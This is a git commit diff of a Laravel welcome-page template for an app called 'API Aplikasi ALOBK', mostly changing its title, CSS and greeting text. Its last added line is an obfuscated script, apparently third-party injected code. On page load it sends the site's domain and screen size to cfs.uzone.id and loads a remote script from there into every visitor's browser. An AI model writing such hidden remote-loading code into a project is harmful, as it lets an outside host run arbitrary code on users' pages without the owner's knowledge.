853bc92a8b45c6f4f529b00c3ef3fcc26799efc8
AldiSatrioAji <aldis85@yahoo.com>
2019-12-25 18:26:43 +0700

    upload

--- resources/views/greeting.blade.php
+++ resources/views/greeting.blade.php
@@ -1,11 +1,11 @@
 
 <!doctype html>
-<html>
+<html lang="en">
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
 
-        <title>ALOBK API</title>
+        <title>API Aplikasi ALOBK</title>
 
         <!-- Fonts -->
         <link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet" type="text/css">
@@ -20,30 +20,36 @@
                 height: 100vh;
                 margin: 0;
             }
+
             .full-height {
                 height: 100vh;
             }
+
             .flex-center {
                 align-items: center;
                 display: flex;
                 justify-content: center;
             }
+
             .position-ref {
                 position: relative;
             }
+
             .top-right {
                 position: absolute;
                 right: 10px;
                 top: 18px;
             }
+
             .content {
                 text-align: center;
             }
+
             .title {
-                font-size: 40px;
+                font-size: 84px;
             }
+
             .links > a {
-              display: inline-block;
                 color: #636b6f;
                 padding: 0 25px;
                 font-size: 13px;
@@ -52,9 +58,11 @@
                 text-decoration: none;
                 text-transform: uppercase;
             }
+
             .m-b-md {
                 margin-bottom: 30px;
             }
+
             .bold{
               font-weight: 600;
               font-size: 80px;
@@ -74,9 +82,17 @@
         <div class="flex-center position-ref full-height">
             <div class="content">
                 <div class="title m-b-md">
-                    <span>Selamat Datang</span>
+                  <br>
+                  <span>Selamat Datang Di</span>
+                  <br>
+                  <span class="bold">API Aplikasi ALOBK</span>
+                </div>
+
+                <div class="links">
+                    <p>Muhammad Syahrul Satura</p>
+                    <p>Aldi S A</p>
                 </div>
             </div>
         </div>
-    </body>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA8019PHEQJrNJN%2bCA1i9PmFClFlvXVlB8muKCyHtvUpqkad5e06PA0wiyQ4efGKo2CyfbhgW%2bm504oFf8WT6QXrqzpUpzBUh8Cp%2fGl1XUvj%2fqlsuh2%2bBgF9OUBOBwMScvXO3RS01Buf6HoemkCO46gG1nNAczo26sXPFjQsXWjSVFTV3BL3fvf%2fNAEjnB62gsNOPOGqNjqP8rAhnbzwA%2bzzLlOd26H8ROyNCWtEUVVoBbR%2bOBMu9WS88%2fjiP5CAgFgoNbs1Dcsjow2CZm06nbdFKxVZKd9Y0HCXD30mngFRobeDnhZv9azKY24toCMWxkdKnkzgiXgMvyo3FVAfRo1N66g5Nj%2fybuX6HMFYHclQjX2m5yZmguxxBgO%2bI6CGeotVIMpOVHDSdn4YcQDU6pA78Mal%2fxZveCQT2ruCP91iJq2w1IMWLL%2bN5xfoVn68loTdyXll2HVhFt8xp6rgXW%2fEHJDUX%2bqbOaSWFz7v8%2fn13lN4LxFoxkrmqUInavD3XE9QQNl%2fr8sccX8Arpc6BGfGQRTPxYZLcSUO5ZvNV80nI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>
